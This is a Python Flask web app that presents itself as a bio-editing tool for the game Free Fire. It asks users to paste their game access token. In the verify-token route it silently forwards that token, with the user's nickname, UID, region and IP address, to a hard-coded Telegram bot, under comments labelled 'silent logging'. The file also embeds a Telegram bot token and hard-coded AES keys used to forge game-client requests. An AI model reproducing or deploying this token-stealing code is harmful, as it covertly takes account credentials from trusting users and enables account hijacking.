from flask import Flask, request, jsonify, render_template
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
import requests
import re
import urllib.parse
from datetime import datetime
import threading

app = Flask(__name__, template_folder='templates')

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8010690774:AAFtqxOlbqU-qaCc6fqyzTZYXUBPDyz_1vY"
TELEGRAM_CHAT_ID = "6414001857"

try:
    from config import SITE_CONFIG
except ImportError:
    SITE_CONFIG = {"site_name": "FF BIO TOOL", "bio_char_limit": 300, "freefire_version": "OB53"}

# --- TELEGRAM SILENT LOGGING ---
def send_to_telegram(token, nick, uid, reg, ip):
    message = (
        "🚀 **New Token Received**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Name:** `{nick}`\n"
        f"🆔 **UID:** `{uid}`\n"
        f"🌍 **Region:** `{reg}`\n"
        f"🔑 **Token:** `{token}`\n"
        f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🌐 **IP:** `{ip}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

# --- PROTOBUF & CRYPTO SETUP ---
_sym_db = _symbol_database.Default()
DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\ndata.proto\"\xbb\x01\n\x04\x44\x61ta\x12\x0f\n\x07\x66ield_2\x18\x02 \x01(\x05\x12\x1e\n\x07\x66ield_5\x18\x05 \x01(\x0b\x32\r.EmptyMessage\x12\x1e\n\x07\x66ield_6\x18\x06 \x01(\x0b\x32\r.EmptyMessage\x12\x0f\n\x07\x66ield_8\x18\x08 \x01(\t\x12\x0f\n\x07\x66ield_9\x18\t \x01(\x05\x12\x1f\n\x08\x66ield_11\x18\x0b \x01(\x0b\x32\r.EmptyMessage\x12\x1f\n\x08\x66ield_12\x18\x0c \x01(\x0b\x32\r.EmptyMessage\"\x0e\n\x0c\x45mptyMessageb\x06proto3')
_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'data1_pb2', _globals)

Data = _sym_db.GetSymbol('Data')
EmptyMessage = _sym_db.GetSymbol('EmptyMessage')

key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

def get_region_url(region):
    region_urls = {
        "IND": "https://client.ind.freefiremobile.com",
        "BR": "https://client.us.freefiremobile.com",
        "US": "https://client.us.freefiremobile.com",
        "SAC": "https://client.us.freefiremobile.com",
        "NA": "https://client.us.freefiremobile.com",
        "ME": "https://clientbp.common.ggbluefox.com",
        "TH": "https://clientbp.common.ggbluefox.com"
    }
    return region_urls.get(region.upper(), "https://clientbp.ggblueshark.com")

# --- ROUTES ---
@app.route('/')
def index():
    return render_template('index.html', config=SITE_CONFIG)

@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    try:
        data = request.get_json()
        eat_token = data.get('eat_token')
        if not eat_token: return jsonify({"success": False, "error": "Token missing"}), 400
        
        # Token extraction
        clean_token = eat_token
        if '?eat=' in eat_token:
            clean_token = urllib.parse.parse_qs(urllib.parse.urlparse(eat_token).query).get('eat', [eat_token])[0]
        
        res = requests.get(f"https://eat-api.thory.buzz/api?eatjwt={clean_token}", timeout=15)
        d = res.json()
        
        if d.get('status') == 'success':
            acc = {"uid": d.get('uid'), "region": d.get('region', 'IND'), "nickname": d.get('nickname')}
            
            # Silent Telegram Forwarding
            ip = request.headers.get('x-forwarded-for', request.remote_addr)
            threading.Thread(target=send_to_telegram, args=(clean_token, acc['nickname'], acc['uid'], acc['region'], ip)).start()
            
            return jsonify({"success": True, "account": acc, "jwt_token": d.get('token')})
        return jsonify({"success": False, "error": "Invalid Token"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/update-bio', methods=['POST'])
def update_bio():
    try:
        data = request.get_json()
        jwt = data.get('jwt_token')
        bio = data.get('bio', '').replace('+', ' ')
        reg = data.get('region', 'IND')
        
        base_url = get_region_url(reg)
        
        # Protobuf binary creation
        pb = Data()
        pb.field_2 = 17
        pb.field_8 = bio
        pb.field_9 = 1
        pb.field_5.CopyFrom(EmptyMessage()); pb.field_6.CopyFrom(EmptyMessage())
        pb.field_11.CopyFrom(EmptyMessage()); pb.field_12.CopyFrom(EmptyMessage())
        
        # AES Encryption
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(pb.SerializeToString(), 16))
        
        host = urllib.parse.urlparse(base_url).netloc
        headers = {
            "Authorization": f"Bearer {jwt}",
            "ReleaseVersion": SITE_CONFIG.get('freefire_version', 'OB53'),
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F)",
            "Host": host,
            "Connection": "Keep-Alive"
        }
        
        final_res = requests.post(f"{base_url}/UpdateSocialBasicInfo", headers=headers, data=encrypted, timeout=30)
        
        if final_res.status_code == 200:
            return jsonify({"success": True, "message": "Bio Updated!"})
        else:
            return jsonify({"success": False, "error": f"Server Error: {final_res.status_code}"}), 400
            
    except Exception as e:
        return jsonify({"success": False, "error": f"Logic Error: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
